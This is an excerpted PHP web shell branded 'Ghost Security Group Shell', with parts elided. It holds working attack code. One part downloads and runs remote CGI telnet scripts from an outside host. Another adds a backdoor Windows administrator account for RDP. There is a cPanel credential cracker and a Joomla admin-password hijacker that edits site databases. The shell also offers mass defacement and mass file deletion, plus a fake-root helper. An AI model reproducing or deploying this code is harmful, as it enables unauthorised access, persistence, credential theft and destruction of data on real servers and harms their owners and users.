...
$password = "593fb3d5c0abac5cf20e20a7ac364139"; # md5: ghostsec
...
<html>
<head>
<title>Ghost Security Group Shell</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
<header>
   ...
   < root@ghostsec:~# ./GhostSec >
   _____________________________
   W3LC0M3 TO GHost Shell =))
   _____________________________
...
<head>
<title>Ghost Security Group Shell</title>
<meta name='author' content='ghostshell'>
<meta charset="UTF-8">
<style type='text/css'>
...
function getfile($name) {
	...
	elseif($name === "webconsole") $get = array("https://raw.githubusercontent.com/Gh0stShe11/webconsole/master/webconsole.php", "webconsole.php");
	elseif($name === "cgitelnet1") $get = array("https://raw.githubusercontent.com/Gh0stShe11/cgitelnet1/master/cgitelnet1.pl", "idx_cgi/cgitelnet1.ghost");
	elseif($name === "cgitelnet2") $get = array("https://raw.githubusercontent.com/Gh0stShe11/cgitelnet2/master/cgitelnet2.pl", "idx_cgi/cgitelnet2.ghost");
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "spawn") {
		...
		elseif($args === "cgitelnet1") {
			if(file_exists("idx_cgi/cgitelnet1.ghost")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.ghost' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet1.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.ghost' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				...
				if(getfile("cgitelnet1")) {
					chmod('idx_cgi/cgitelnet1.ghost', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.ghost' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
		...
		elseif($args === "cgitelnet2") {
			if(file_exists("idx_cgi/cgitelnet2.ghost")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.ghost' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet2.idx')) {
				...
				if(getfile("cgitelnet2")) {
					chmod('idx_cgi/cgitelnet2.ghost', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.ghost' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/GhostSec/", exe("net user"))) die(color(1, 1, "[INFO] username 'GhostSec' already exists."));

		$add_user   = exe("net user GhostSec GhostSec /add");
    	$add_groups1 = exe("net localgroup Administrators GhostSec /add");
    	$add_groups2 = exe("net localgroup Administrator GhostSec /add");
    	$add_groups3 = exe("net localgroup Administrateur GhostSec /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "GhostSec")."<br>
    	Password: ".color(1, 2, "GhostSec")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://ghost-sec.org' target='_blank'>".color(1, 2, "Ghost Security Group")."</a></center>";
}
...
function action() {
  ...
  print "<li>[ <a href='?dir=".path()."&do=ghostsec'>Ghost Security Group !</a> ]</li>";
	print "</ul>";
	print "</center>";
	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='GhostSec'><br><br>
		    	       Domains: <br>
    ...
    elseif($_GET['do'] === "ghostsec") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=ghostsec&dir=".path()."'>
		    	       Shell Writed By  : <br>
		    	       <center><b><h1>MRX 4774CK3R</center></b></h1>
		    	       Ghost Security Official Members: <br>
		    	       MRX 4774CK3R - SOLTAN SILENT - HYDRA BOY - MEhDiMasIh - HamiDhACkeR
		    	       </form></center>";
		   	}
		}
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Ghostsec")."</p>";
			} else {
				print "<center>
					   <span>Cpanel Cracker Writed By GHost Secur!ty Group </span><br>
					   <form method='post'>
					   USER: <br>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
					...
					foreach($scan_conf as $file_conf) {
						...
						if(preg_match("/JConfig|joomla/",$config)) {
							...
							if(!$update OR !$conn OR !$db) {
								...
								print "Status => ".color(1, 2, "SUCCESS edit user")."<br><br>";
							}
							mysql_close($conn);
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='GhostSec' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='GhostSec' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Done!!'>
				</form></center>";
			}
		}
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>					   <font style='text-decoration: underline;'>Folder:</font><br>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Ghost Security Group </textarea><br>
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				NB: Before installing this Tools, first upload your deface files in the dir /home/user/and/home/user/public_html.</center>";
			}
		}
	}
